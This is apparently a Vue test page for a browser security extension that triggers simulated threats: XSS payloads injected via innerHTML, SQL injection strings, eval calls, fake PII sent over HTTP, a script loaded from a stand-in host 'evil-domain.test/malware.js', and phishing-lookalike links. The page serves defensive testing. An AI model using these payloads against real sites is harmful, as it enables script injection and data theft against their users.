<script setup lang="ts">
import { onMounted, ref } from 'vue'

const xssInput1 = ref('<script>console.log("XSS")<\/script>')
const xssInput2 = ref('<img src=x onerror="console.log(\'XSS\')">')
const xssInput3 = ref('<a href="javascript:console.log(\'XSS\')">点击<\/a>')
const obfuscatedCode = ref('var _0x1a2b=["\\x63\\x6F\\x6E\\x73\\x6F\\x6C\\x65","\\x6C\\x6F\\x67","\\x48\\x65\\x6C\\x6C\\x6F"];window[_0x1a2b[0]][_0x1a2b[1]](_0x1a2b[2]);')
const trackerStatus = ref<string[]>([])
const maliciousUrlResults = ref<Record<string, string>>({})
const customUrlInput = ref('http://malware-example.com')
const customUrlResult = ref('')
const batchTestResults = ref<Array<{ url: string; status: string }>>([])
const iframeMaliciousResult = ref('')

// 内置的恶意URL列表（与background script中的一致）
const testMaliciousUrls = [
  'http://malware-example.com',
  'http://phishing-test.net',
  'http://suspicious-site.org',
  'http://fake-bank.com',
  'http://scam-lottery.net'
]

function testXSS1() {
  const payload = xssInput1.value.trim()
  console.log('XSS测试1 - 输入内容:', payload)
  if (!payload) return
  document.body.insertAdjacentHTML('beforeend', payload)
}

function testXSS2() {
  const payload = xssInput2.value.trim()
  console.log('XSS测试2 - 输入内容:', payload)
  if (!payload) return
  const wrapper = document.createElement('div')
  wrapper.innerHTML = payload
  document.body.appendChild(wrapper)
}

function testXSS3() {
  const payload = xssInput3.value.trim()
  console.log('XSS测试3 - 输入内容:', payload)
  if (!payload) return
  const wrapper = document.createElement('div')
  wrapper.innerHTML = payload
  document.body.appendChild(wrapper)
}

function testEval() {
  console.log('测试 eval() 调用')
  try {
    // eslint-disable-next-line no-eval
    eval('console.log("eval executed")')
  } catch (error) {
    console.error('eval() 被阻止:', error)
  }
}

function testFunctionConstructor() {
  console.log('测试 Function() 构造函数')
  try {
    const fn = new Function('console.log("Function executed")')
    fn()
  } catch (error) {
    console.error('Function() 被阻止:', error)
  }
}

function testSetTimeoutString() {
  console.log('测试 setTimeout(string) 调用')
  // eslint-disable-next-line @typescript-eslint/no-implied-eval
  setTimeout('console.log("setTimeout executed")', 100)
}

function testSQLInjection(event: Event) {
  event.preventDefault()
  const form = event.target as HTMLFormElement | null
  if (!form) return false
  const formData = new FormData(form)
  console.group('SQL注入测试 - 表单数据:')
  for (const [key, value] of formData.entries()) {
    console.log(`  ${key}: ${value}`)
  }
  console.groupEnd()
  console.log('✅ 表单已提交，等待插件检测...')
  return false
}

function testSensitiveData(event: Event) {
  event.preventDefault()
  const form = event.target as HTMLFormElement | null
  if (!form) return false
  const formData = new FormData(form)
  console.group('敏感信息测试 - 提交数据:')
  for (const [key, value] of formData.entries()) {
    console.log(`  ${key}: ${value}`)
  }
  console.groupEnd()
  console.log('✅ 敏感信息已提交，等待插件检测...')
  return false
}

function injectMaliciousScript() {
  const script = document.createElement('script')
  script.textContent = `
    // 这是一个模拟的可疑脚本
    eval('console.log("malicious code executed")')
    document.cookie = 'session=stolen-data'
  `
  document.body.appendChild(script)
  console.log('已注入可疑脚本片段')
}

function injectExternalScript() {
  const script = document.createElement('script')
  script.src = 'http://evil-domain.test/malware.js'
  script.onerror = () => {
    console.warn('外部恶意脚本加载失败或被阻止')
  }
  document.body.appendChild(script)
  console.log('尝试加载外部恶意脚本')
}

function testObfuscatedCode() {
  const code = obfuscatedCode.value.trim()
  if (!code) return
  console.log('检测混淆代码样本:', code.substring(0, 120) + '...')
  console.log('✅ 代码已提交检测，等待插件反馈...')
}

function updateTrackerStatus(message: string) {
  const timestamp = new Date().toLocaleTimeString()
  trackerStatus.value.push(`${timestamp} - ${message}`)
}

function loadTracker(url: string, success: string, blocked: string) {
  const script = document.createElement('script')
  script.src = url
  script.onload = () => updateTrackerStatus(success)
  script.onerror = () => updateTrackerStatus(blocked)
  document.head.appendChild(script)
}

function loadGoogleAnalytics() {
  loadTracker(
    'https://www.google-analytics.com/analytics.js',
    'Google Analytics 加载成功（未被阻止）',
    'Google Analytics 被阻止 ✓'
  )
}

function loadFacebookPixel() {
  loadTracker(
    'https://connect.facebook.net/en_US/fbevents.js',
    'Facebook Pixel 加载成功（未被阻止）',
    'Facebook Pixel 被阻止 ✓'
  )
}

function loadMixpanel() {
  loadTracker(
    'https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js',
    'Mixpanel 加载成功（未被阻止）',
    'Mixpanel 被阻止 ✓'
  )
}

// 恶意URL测试函数
function testMaliciousUrl(url: string, index: number) {
  console.log('🔍 测试恶意URL:', url)
  maliciousUrlResults.value[`result-${index}`] = '⏳ 检测中...'
  
  // 创建一个隐藏的iframe尝试加载URL
  const iframe = document.createElement('iframe')
  iframe.style.display = 'none'
  iframe.src = url
  
  let resolved = false
  
  iframe.onerror = () => {
    if (!resolved) {
      resolved = true
      console.log('✅ URL被阻止:', url)
      maliciousUrlResults.value[`result-${index}`] = '✅ 已被阻止'
      setTimeout(() => iframe.remove(), 100)
    }
  }
  
  iframe.onload = () => {
    if (!resolved) {
      resolved = true
      console.log('⚠️ URL未被阻止:', url)
      maliciousUrlResults.value[`result-${index}`] = '⚠️ 未被阻止'
      setTimeout(() => iframe.remove(), 100)
    }
  }
  
  document.body.appendChild(iframe)
  
  // 5秒后超时
  setTimeout(() => {
    if (!resolved) {
      resolved = true
      maliciousUrlResults.value[`result-${index}`] = '⏱️ 检测超时'
      iframe.remove()
    }
  }, 5000)
}

function testCustomUrl() {
  const url = customUrlInput.value.trim()
  
  if (!url) {
    customUrlResult.value = '❌ 请输入URL'
    return
  }
  
  console.log('🔍 检测自定义URL:', url)
  customUrlResult.value = '⏳ 正在检测...'
  
  // 尝试通过fetch检测
  fetch(url, { mode: 'no-cors', method: 'HEAD' })
    .then(() => {
      customUrlResult.value = `⚠️ URL可访问: ${url}\n该URL未在恶意URL列表中，或未被阻止`
      console.log('URL可访问:', url)
    })
    .catch((error: Error) => {
      customUrlResult.value = `✅ URL被阻止或无法访问: ${url}\n错误: ${error.message}`
      console.log('URL被阻止或无法访问:', error)
    })
}

function testIframeMalicious() {
  iframeMaliciousResult.value = '⏳ 正在加载...'
  
  const iframe = document.createElement('iframe')
  iframe.src = 'http://malware-example.com'
  iframe.style.width = '100%'
  iframe.style.height = '200px'
  iframe.style.border = '2px solid #dee2e6'
  iframe.style.borderRadius = '8px'
  iframe.style.display = 'none'
  
  let resolved = false
  
  iframe.onerror = () => {
    if (!resolved) {
      resolved = true
      iframeMaliciousResult.value = '✅ 恶意URL在iframe中被成功阻止'
      console.log('✅ iframe加载恶意URL被阻止')
      setTimeout(() => iframe.remove(), 100)
    }
  }
  
  iframe.onload = () => {
    if (!resolved) {
      resolved = true
      iframeMaliciousResult.value = '⚠️ 恶意URL在iframe中未被阻止'
      console.log('⚠️ iframe加载恶意URL未被阻止')
      setTimeout(() => iframe.remove(), 3000)
    }
  }
  
  document.body.appendChild(iframe)
  
  // 5秒后超时
  setTimeout(() => {
    if (!resolved) {
      resolved = true
      iframeMaliciousResult.value = '⏱️ iframe加载超时'
      iframe.remove()
    }
  }, 5000)
}

function batchTestUrls() {
  batchTestResults.value = []
  console.log('🔍 开始批量测试恶意URL')
  
  let completed = 0
  const results: Array<{ url: string; status: string }> = []
  
  testMaliciousUrls.forEach((url, index) => {
    const img = new Image()
    img.src = url + '/favicon.ico'
    
    let resolved = false
    
    const timeout = setTimeout(() => {
      if (!resolved) {
        resolved = true
        results[index] = { url, status: '✅ 被阻止或超时' }
        completed++
        updateBatchResults()
      }
    }, 2000)
    
    img.onerror = () => {
      if (!resolved) {
        resolved = true
        clearTimeout(timeout)
        results[index] = { url, status: '✅ 被阻止' }
        completed++
        updateBatchResults()
        console.log('✅ URL被阻止:', url)
      }
    }
    
    img.onload = () => {
      if (!resolved) {
        resolved = true
        clearTimeout(timeout)
        results[index] = { url, status: '⚠️ 未被阻止' }
        completed++
        updateBatchResults()
        console.log('⚠️ URL未被阻止:', url)
      }
    }
  })
  
  function updateBatchResults() {
    batchTestResults.value = [...results].filter(r => r)
    if (completed === testMaliciousUrls.length) {
      const blocked = results.filter(r => r.status.includes('阻止')).length
      console.log(`📊 批量测试完成: ${blocked}/${testMaliciousUrls.length} 个URL被阻止`)
    }
  }
}

function openMaliciousUrl(url: string) {
  console.log('恶意URL访问测试 - 尝试打开:', url)
  window.open(url, '_blank', 'noopener')
}

function fetchMaliciousResource(url: string) {
  console.log('恶意URL访问测试 - 尝试请求:', url)
  fetch(url, { mode: 'no-cors' })
    .then(() => updateTrackerStatus(`已发出对 ${url} 的可疑请求`))
    .catch((error) => console.warn('请求被阻止或失败:', error))
}

function injectMaliciousIframe(url: string) {
  const iframe = document.createElement('iframe')
  iframe.src = url
  iframe.style.display = 'none'
  document.body.appendChild(iframe)
  console.log('注入隐藏iframe以模拟驱动下载:', url)
}

onMounted(() => {
  console.log('%c🛡️ Web Security Guardian 测试页面已加载', 'color: #667eea; font-size: 16px; font-weight: bold')
  console.log('本页面包含多种危险行为模拟场景，仅用于本地安全测试。请勿在生产环境部署。')
})
</script>

<template>
  <main class="page">
    <div class="container">
      <h1>🛡️ Web Security Guardian</h1>
      <p class="subtitle">浏览器安全插件综合危险行为测试页</p>


      <section class="test-section">
        <h2>恶意URL访问测试 <span class="status testing">Testing</span></h2>
        
        <div class="test-item">
          <h3>1. 内置恶意URL测试</h3>
          <!-- <p style="margin-bottom: 12px; color: #666;">以下是插件内置的恶意URL列表，尝试访问这些URL会被阻止：</p> -->
          <div class="malicious-url-tests">
            <div v-for="(url, index) in testMaliciousUrls" :key="url" class="url-test-row">
              <button @click="testMaliciousUrl(url, index + 1)">
                测试: {{ url.replace('http://', '') }}
              </button>
              <!-- <span 
                class="test-result" 
                :class="{
                  'testing': maliciousUrlResults[`result-${index + 1}`]?.includes('检测中'),
                  'blocked': maliciousUrlResults[`result-${index + 1}`]?.includes('阻止'),
                  'failed': maliciousUrlResults[`result-${index + 1}`]?.includes('未被阻止')
                }"
              >
                {{ maliciousUrlResults[`result-${index + 1}`] || '等待测试' }}
              </span> -->
            </div>
          </div>
          <!-- <p class="warning" style="margin-top: 12px;">⚠️ 这些URL仅用于测试，不会真正访问</p> -->
        </div>

        <!-- <div class="test-item">
          <h3>2. 自定义URL检测</h3>
          <p style="margin-bottom: 12px; color: #666;">输入任意URL测试插件的检测功能：</p>
          <input 
            v-model="customUrlInput" 
            placeholder="输入要测试的URL，例如：http://example.com" 
            @keyup.enter="testCustomUrl"
          />
          <button @click="testCustomUrl">检测URL</button>
          <div v-if="customUrlResult" class="custom-result" :class="{
            'success': customUrlResult.includes('被阻止'),
            'warning': customUrlResult.includes('可访问'),
            'error': customUrlResult.includes('请输入')
          }">
            <pre>{{ customUrlResult }}</pre>
          </div>
        </div> -->

        <div class="test-item">
          <h3>2. iframe加载恶意URL</h3>
          <p style="margin-bottom: 12px; color: #666;">尝试在iframe中加载恶意URL（应被阻止）：</p>
          <button @click="testIframeMalicious">在iframe中加载恶意网站</button>
          <!-- <div v-if="iframeMaliciousResult" class="iframe-result" :class="{
            'success': iframeMaliciousResult.includes('阻止'),
            'warning': iframeMaliciousResult.includes('未被阻止'),
            'testing': iframeMaliciousResult.includes('检测中')
          }">
            {{ iframeMaliciousResult }}
          </div> -->
        </div>

        <!-- <div class="test-item">
          <h3>4. 批量URL检测</h3>
          <p style="margin-bottom: 12px; color: #666;">一次性测试所有内置恶意URL：</p>
          <button @click="batchTestUrls">批量测试所有恶意URL</button>
          <div v-if="batchTestResults.length > 0" class="batch-results">
            <h4 style="margin: 12px 0 8px; font-size: 14px;">批量测试结果：</h4>
            <div v-for="result in batchTestResults" :key="result.url" class="batch-result-item">
              <span :class="{ 'blocked': result.status.includes('阻止'), 'failed': result.status.includes('未被阻止') }">
                {{ result.status }}
              </span>
              <span class="url-text">{{ result.url }}</span>
            </div>
          </div>
        </div> -->
      </section>

      <section class="test-section">
        <h2>XSS攻击检测测试 <span class="status testing">Testing</span></h2>
        <div class="test-item">
          <h3>2. Script标签注入</h3>
          <input v-model="xssInput1" placeholder="在此输入恶意payload..." />
          <button @click="testXSS1">触发Script注入</button>
        </div>
        <div class="test-item">
          <h3>3. 事件处理器注入</h3>
          <input v-model="xssInput2" placeholder="测试onerror事件..." />
          <button @click="testXSS2">触发事件注入</button>
        </div>
        <div class="test-item">
          <h3>4. JavaScript伪协议</h3>
          <input v-model="xssInput3" placeholder="测试javascript:协议..." />
          <button @click="testXSS3">触发协议注入</button>
        </div>
        <!-- <div class="test-item">
          <h3>5. 危险函数调用</h3>
          <button class="danger" @click="testEval">测试 eval()</button>
          <button class="danger" @click="testFunctionConstructor">测试 Function()</button>
          <button class="danger" @click="testSetTimeoutString">测试 setTimeout(string)</button>
        </div> -->
      </section>

      <section class="test-section">
        <h2>SQL注入检测测试</h2>
        <div class="test-item">
          <h3>5. 表单SQL注入</h3>
          <form @submit.prevent="testSQLInjection">
            <input name="username" value="admin' OR '1'='1" placeholder="用户名 (如: admin' OR '1'='1)" />
            <input name="search" value="'; DROP TABLE users--" placeholder="搜索 (如: '; DROP TABLE users--)" />
            <button type="submit">提交表单</button>
          </form>
        </div>
      </section>

      <section class="test-section">
        <h2>敏感信息泄露检测</h2>
        <div class="test-item">
          <h3>6. 非HTTPS提交敏感数据</h3>
          <form action="http://example.com/login" method="post" @submit.prevent="testSensitiveData">
            <input name="email" type="email" value="security@example.com" placeholder="邮箱: security@example.com" />
            <input name="phone" type="tel" value="13800138000" placeholder="手机号: 13800138000" />
            <input name="id" value="110101199001011234" placeholder="身份证号: 110101199001011234" />
            <input name="card" value="4111 1111 1111 1111" placeholder="信用卡: 4111 1111 1111 1111" />
            <button type="submit">提交敏感信息</button>
          </form>
        </div>
      </section>

      <section class="test-section">
        <h2>恶意脚本注入检测</h2>
        <div class="test-item">
          <h3>7. 动态脚本注入</h3>
          <button class="danger" @click="injectMaliciousScript">注入可疑内联脚本</button>
          <button class="danger" @click="injectExternalScript">加载外部恶意脚本</button>
        </div>
        
      </section>

      <section class="test-section">
        <h2>第三方追踪器阻止测试</h2>
        <div class="test-item">
          <h3>8. 尝试加载常见追踪脚本</h3>
          <button @click="loadGoogleAnalytics">加载 Google Analytics</button>
          <button @click="loadFacebookPixel">加载 Facebook Pixel</button>
          <button @click="loadMixpanel">加载 Mixpanel</button>
          <div class="tracker-status">
            <p
              v-for="(entry, index) in trackerStatus"
              :key="index"
              :class="{ blocked: entry.includes('被阻止') }"
            >
              {{ entry }}
            </p>
          </div>
        </div>
      </section>

      <section class="test-section">
        <h2>钓鱼网站检测测试</h2>
        <div class="test-item">
          <h3>9. 可疑链接集合</h3>
          <div class="phishing-links">
            <a href="http://paypal-secure-verify.test" target="_blank" rel="noreferrer">paypal-secure-verify.test</a>
            <a href="http://amazon-account-verify.test" target="_blank" rel="noreferrer">amazon-account-verify.test</a>
            <a href="http://google-security-check.test" target="_blank" rel="noreferrer">google-security-check.test</a>
          </div>
        </div>
      </section>

    </div>
  </main>
</template>

<style scoped>
:global(body) {
  margin: 0;
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  min-height: 100vh;
}

.page {
  width: 100%;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  box-sizing: border-box;
  padding: 60px 24px;
  color: #333;
}

.container {
  max-width: 1200px;
  width: 100%;
  height: fit-content;
  margin: auto;
  background: #fff;
  border-radius: 20px;
  padding: 48px 40px;
  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
  animation: fadeIn 0.5s ease-in;
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(20px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

h1 {
  color: #667eea;
  text-align: center;
  margin: 0 0 16px;
  font-size: 2.5em;
  font-weight: 700;
  text-shadow: 2px 2px 4px rgba(102, 126, 234, 0.1);
}

.subtitle {
  text-align: center;
  color: #666;
  margin: 0 0 40px;
  font-size: 1.1em;
  font-weight: 500;
}

.test-section {
  background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
  border-radius: 12px;
  padding: 28px;
  margin-bottom: 28px;
  border-left: 6px solid #667eea;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
  transition: transform 0.2s ease, box-shadow 0.2s ease;
}

.test-section:hover {
  transform: translateY(-2px);
  box-shadow: 0 8px 20px rgba(0, 0, 0, 0.12);
}

.test-section h2 {
  display: flex;
  align-items: center;
  gap: 12px;
  margin: 0 0 20px;
  color: #764ba2;
  font-size: 1.4em;
  font-weight: 600;
}

.status {
  display: inline-block;
  padding: 6px 14px;
  border-radius: 20px;
  font-size: 11px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  color: #155724;
  background: linear-gradient(135deg, #d4edda, #c3e6cb);
  box-shadow: 0 2px 6px rgba(21, 87, 36, 0.2);
}

.status.testing {
  background: linear-gradient(135deg, #fff3cd, #ffeaa7);
  color: #856404;
  box-shadow: 0 2px 6px rgba(133, 100, 4, 0.2);
}

.test-item {
  background: #fff;
  padding: 22px;
  border-radius: 10px;
  border: 2px solid #e9ecef;
  margin-bottom: 18px;
  transition: border-color 0.2s ease, box-shadow 0.2s ease;
}

.test-item:hover {
  border-color: #667eea;
  box-shadow: 0 4px 12px rgba(102, 126, 234, 0.15);
}

.test-item:last-of-type {
  margin-bottom: 0;
}

.test-item h3 {
  margin: 0 0 14px;
  color: #495057;
  font-size: 1.1em;
  font-weight: 600;
}

button {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  color: #fff;
  border: none;
  padding: 12px 24px;
  border-radius: 8px;
  cursor: pointer;
  font-size: 14px;
  font-weight: 600;
  transition: all 0.3s ease;
  margin-right: 10px;
  margin-bottom: 10px;
  box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
  position: relative;
  overflow: hidden;
}

button::before {
  content: '';
  position: absolute;
  top: 50%;
  left: 50%;
  width: 0;
  height: 0;
  border-radius: 50%;
  background: rgba(255, 255, 255, 0.3);
  transform: translate(-50%, -50%);
  transition: width 0.6s, height 0.6s;
}

button:hover::before {
  width: 300px;
  height: 300px;
}

button:hover {
  transform: translateY(-2px);
  box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
}

button:active {
  transform: translateY(0);
}

button.danger {
  background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
  box-shadow: 0 4px 12px rgba(220, 53, 69, 0.3);
}

button.danger:hover {
  box-shadow: 0 8px 20px rgba(220, 53, 69, 0.4);
}

input,
textarea {
  width: 100%;
  padding: 12px 16px;
  margin: 8px 0 12px;
  border: 2px solid #e9ecef;
  border-radius: 8px;
  box-sizing: border-box;
  font-family: 'Courier New', Courier, monospace;
  font-size: 14px;
  transition: border-color 0.3s ease, box-shadow 0.3s ease;
  background: #fff;
}

input:focus,
textarea:focus {
  outline: none;
  border-color: #667eea;
  box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
}

textarea {
  min-height: 120px;
  resize: vertical;
  line-height: 1.6;
}

.warning {
  background: #fff3cd;
  border-left: 4px solid #ffc107;
  padding: 14px;
  border-radius: 6px;
  margin-top: 12px;
  color: #856404;
}

.info {
  background: #d1ecf1;
  border-left: 4px solid #0dcaf0;
  padding: 16px;
  border-radius: 6px;
  margin-bottom: 24px;
  color: #055160;
}

.info ul {
  margin: 10px 0 0;
  padding-left: 20px;
}

code {
  background: #f8f9fa;
  padding: 2px 6px;
  border-radius: 4px;
  color: #e83e8c;
}

.tracker-status {
  margin-top: 12px;
}

.tracker-status p {
  margin: 6px 0;
  color: #d6336c;
}

.tracker-status p.blocked {
  color: #1b5e20;
}

.phishing-links {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
  gap: 10px;
  padding: 12px;
  background: #fff;
  border-radius: 6px;
  border: 1px solid #dee2e6;
}

.phishing-links a {
  color: #dc3545;
  text-decoration: none;
  word-break: break-all;
}

.phishing-links a:hover {
  text-decoration: underline;
}

/* 恶意URL测试样式 */
.malicious-url-tests {
  display: flex;
  flex-direction: column;
  gap: 10px;
  background: #fff;
  padding: 16px;
  border-radius: 8px;
  border: 2px solid #e9ecef;
}

.url-test-row {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 8px;
  background: #f8f9fa;
  border-radius: 6px;
  transition: background-color 0.2s ease;
}

.url-test-row:hover {
  background: #e9ecef;
}

.url-test-row button {
  margin: 0;
  flex-shrink: 0;
  min-width: 200px;
}

.test-result {
  font-size: 13px;
  font-weight: 600;
  padding: 4px 12px;
  border-radius: 12px;
  background: #e9ecef;
  color: #6c757d;
  transition: all 0.3s ease;
}

.test-result.testing {
  background: #fff3cd;
  color: #856404;
  animation: pulse 1.5s ease-in-out infinite;
}

.test-result.blocked {
  background: #d4edda;
  color: #155724;
}

.test-result.failed {
  background: #f8d7da;
  color: #721c24;
}

@keyframes pulse {
  0%, 100% {
    opacity: 1;
  }
  50% {
    opacity: 0.6;
  }
}

.custom-result,
.iframe-result {
  margin-top: 12px;
  padding: 14px;
  border-radius: 8px;
  border: 2px solid #e9ecef;
  font-size: 13px;
  line-height: 1.6;
  transition: all 0.3s ease;
}

.custom-result pre {
  margin: 0;
  white-space: pre-wrap;
  word-break: break-all;
  font-family: 'Courier New', Courier, monospace;
  font-size: 13px;
}

.custom-result.success,
.iframe-result.success {
  background: #d4edda;
  border-color: #c3e6cb;
  color: #155724;
}

.custom-result.warning,
.iframe-result.warning {
  background: #fff3cd;
  border-color: #ffeaa7;
  color: #856404;
}

.custom-result.error {
  background: #f8d7da;
  border-color: #f5c6cb;
  color: #721c24;
}

.iframe-result.testing {
  background: #d1ecf1;
  border-color: #bee5eb;
  color: #0c5460;
}

.batch-results {
  margin-top: 12px;
  padding: 14px;
  background: #fff;
  border-radius: 8px;
  border: 2px solid #e9ecef;
}

.batch-result-item {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 8px;
  margin-bottom: 6px;
  border-radius: 4px;
  background: #f8f9fa;
  font-size: 13px;
}

.batch-result-item:last-child {
  margin-bottom: 0;
}

.batch-result-item span:first-child {
  font-weight: 600;
  min-width: 120px;
}

.batch-result-item .blocked {
  color: #155724;
}

.batch-result-item .failed {
  color: #721c24;
}

.batch-result-item .url-text {
  color: #6c757d;
  word-break: break-all;
}

@media (max-width: 768px) {
  .page {
    padding: 20px 16px;
  }

  .container {
    padding: 32px 24px;
    border-radius: 16px;
  }

  h1 {
    font-size: 2em;
  }

  .subtitle {
    font-size: 1em;
  }

  .test-section {
    padding: 20px;
  }

  .test-section h2 {
    font-size: 1.2em;
    flex-wrap: wrap;
  }

  .test-item {
    padding: 18px;
  }

  button {
    width: 100%;
    margin-right: 0;
  }

  .phishing-links {
    grid-template-columns: 1fr;
  }

  .url-test-row {
    flex-direction: column;
    align-items: stretch;
  }

  .url-test-row button {
    min-width: auto;
    width: 100%;
  }

  .test-result {
    text-align: center;
  }

  .batch-result-item {
    flex-direction: column;
    align-items: flex-start;
  }

  .batch-result-item span:first-child {
    min-width: auto;
  }
}
</style>
